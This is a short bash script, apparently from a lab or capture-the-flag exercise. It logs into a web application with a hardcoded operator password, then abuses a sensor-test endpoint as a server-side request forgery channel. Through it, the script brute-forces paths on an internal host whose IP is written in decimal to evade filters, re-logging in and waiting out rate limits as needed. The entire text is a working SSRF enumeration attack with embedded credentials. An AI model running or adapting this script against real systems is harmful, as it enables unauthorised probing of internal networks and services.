#!/bin/bash
BASE="http://169.58.126.107:6002"
dec=2887319554
jar=$(mktemp)
/usr/bin/curl -s -c "$jar" -X POST "$BASE/login" -d "username=operator&password=St33lW0rks!2024" -o /dev/null
for word in "$@"; do
  res=$(/usr/bin/curl -s -m 6 -b "$jar" -X POST "$BASE/ops/test-sensor" -H "Content-Type: application/json" -d "{\"url\":\"http://$dec:4000/$word\",\"method\":\"POST\"}")
  if [[ "$res" == *"Redirecting to /login"* ]] || [[ -z "$res" ]]; then
    /usr/bin/curl -s -c "$jar" -X POST "$BASE/login" -d "username=operator&password=St33lW0rks!2024" -o /dev/null
    res=$(/usr/bin/curl -s -m 6 -b "$jar" -X POST "$BASE/ops/test-sensor" -H "Content-Type: application/json" -d "{\"url\":\"http://$dec:4000/$word\",\"method\":\"POST\"}")
  fi
  if [[ "$res" == *"rate limited"* ]]; then
    echo "RATE LIMITED at $word, waiting 600s"
    sleep 600
    res=$(/usr/bin/curl -s -m 6 -b "$jar" -X POST "$BASE/ops/test-sensor" -H "Content-Type: application/json" -d "{\"url\":\"http://$dec:4000/$word\",\"method\":\"POST\"}")
  fi
  echo "POST /$word -> $res"
  sleep 3
done
rm -f "$jar"
